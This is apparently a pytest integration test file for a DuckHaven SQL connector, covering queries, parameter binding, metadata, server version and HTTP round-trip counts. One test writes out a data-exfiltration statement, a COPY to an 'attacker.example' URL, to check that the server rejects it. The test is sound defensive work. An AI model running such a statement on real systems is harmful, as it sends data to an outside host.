"""Live integration tests against a real DuckHaven with SQL sessions enabled.

Opt-in: skipped unless ``DUCKHAVEN_TEST_HOST``, ``DUCKHAVEN_TEST_WORKSPACE``, and
``DUCKHAVEN_TEST_PAT`` are set. Run with::

    make test-integration

The target server must have ``SQL_SESSIONS_ENABLED=true`` and the PAT's principal must be
a member of the workspace with at least one connected, compatible agent.
"""

import os

import pytest

from duckhaven_sql_connector import ProgrammingError, ServerVersion, connect

pytestmark = pytest.mark.integration

HOST = os.environ.get("DUCKHAVEN_TEST_HOST")
WORKSPACE = os.environ.get("DUCKHAVEN_TEST_WORKSPACE")
TOKEN = os.environ.get("DUCKHAVEN_TEST_PAT")
AGENT = os.environ.get("DUCKHAVEN_TEST_AGENT") or None
CATALOG = os.environ.get("DUCKHAVEN_TEST_CATALOG") or None

if not (HOST and WORKSPACE and TOKEN):
    pytest.skip(
        "set DUCKHAVEN_TEST_HOST/WORKSPACE/PAT to run live integration tests",
        allow_module_level=True,
    )


@pytest.fixture
def conn():
    connection = connect(host=HOST, workspace=WORKSPACE, token=TOKEN, agent=AGENT, catalog=CATALOG)
    try:
        yield connection
    finally:
        connection.close()


def test_select_one(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1 AS one")
    rows = cur.fetchall()
    assert rows == [(1,)]
    assert cur.description[0][0] == "one"


def test_multi_statement_session_reuse(conn):
    cur = conn.cursor()
    cur.execute("SELECT 1")
    assert cur.fetchall() == [(1,)]
    cur.execute("SELECT 2")
    assert cur.fetchall() == [(2,)]


def test_parameter_binding(conn):
    cur = conn.cursor()
    cur.execute("SELECT ? AS n, ? AS s", [7, "hi"])
    assert cur.fetchall() == [(7, "hi")]


def test_hostile_copy_is_rejected(conn):
    cur = conn.cursor()
    with pytest.raises(ProgrammingError):
        cur.execute("COPY (SELECT 1) TO 'http://attacker.example/leak'")


def test_statement_after_close_raises(conn):
    conn.close()
    with pytest.raises(ProgrammingError):
        conn.cursor()


def test_metadata_catalogs_and_tables(conn):
    cur = conn.cursor()
    cur.catalogs()
    catalogs = [row[0] for row in cur.fetchall()]
    assert isinstance(catalogs, list)  # at least the attached workspace catalogs

    cur.tables()
    assert cur.description is not None
    assert "table_name" in [col[0] for col in cur.description]


def test_server_version(conn):
    # Robust to either server generation: a server predating GET /api/version returns None,
    # a newer one returns a well-formed ServerVersion.
    version = conn.server_version()
    assert version is None or isinstance(version, ServerVersion)
    if version is not None:
        assert isinstance(version.version, str) and version.version
        assert isinstance(version.api_version, int)


def _count_status_polls(statement_wait):
    """Run one statement and count the GET /queries/{id} status calls it cost."""
    from duckhaven_sql_connector._telemetry import Hooks

    polls = []

    def on_request(method, path, status, duration):
        if method == "GET" and path.startswith("/queries/") and not path.endswith("/rows"):
            polls.append(path)

    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        statement_wait=statement_wait,
        hooks=Hooks(on_request=on_request),
    )
    try:
        cur = connection.cursor()
        cur.execute("SELECT 1")  # warm the session; ignore its calls
        polls.clear()
        cur.execute("SELECT 42 AS n")
        assert cur.fetchall() == [(42,)]
        return len(polls)
    finally:
        connection.close()


def test_statement_wait_removes_the_status_poll_round_trips():
    """The behaviour the wait exists for, against a real server: a statement that
    finishes inside the budget costs no status polls at all.

    Unit tests can only prove the connector *stops* polling when handed a terminal
    submit response — that the server actually holds the call is a property of the
    pair, so it is asserted here. Skips against a server too old to know the field,
    which answers 202 immediately and polls exactly as it always did.
    """
    with_wait = _count_status_polls(30.0)
    if with_wait > 0:
        pytest.skip("server does not support wait_timeout_s on the statement call")
    without_wait = _count_status_polls(0)

    assert with_wait == 0
    assert without_wait >= 1, "wait_timeout_s=0 must restore submit-then-poll"


def test_the_first_page_arrives_on_the_submit_response():
    """One HTTP call per statement, against a real server.

    A unit test can only show the cursor skips its fetch when handed a page; that the
    server actually puts one there is a property of the pair. Skips against a server
    that does not support it, which answers without a page and costs two calls.
    """
    from duckhaven_sql_connector._telemetry import Hooks

    calls: list[tuple[str, str]] = []

    def on_request(method, path, status, duration):
        calls.append((method, path.split("?")[0]))

    connection = connect(
        host=HOST,
        workspace=WORKSPACE,
        token=TOKEN,
        agent=AGENT,
        catalog=CATALOG,
        hooks=Hooks(on_request=on_request),
    )
    try:
        cur = connection.cursor()
        cur.execute("SELECT 1")  # warm the session; ignore its calls
        calls.clear()
        cur.execute("SELECT 42 AS answer, 'x' AS s")
        assert cur.fetchall() == [(42, "x")]
        assert cur.description[0][0] == "answer"
        assert cur.rowcount == 1
        row_fetches = [p for m, p in calls if m == "GET" and p.endswith("/rows")]
        if row_fetches:
            pytest.skip("server does not return a first page on the statement response")
        assert len(calls) == 1, f"expected one HTTP call, got {calls}"
    finally:
        connection.close()
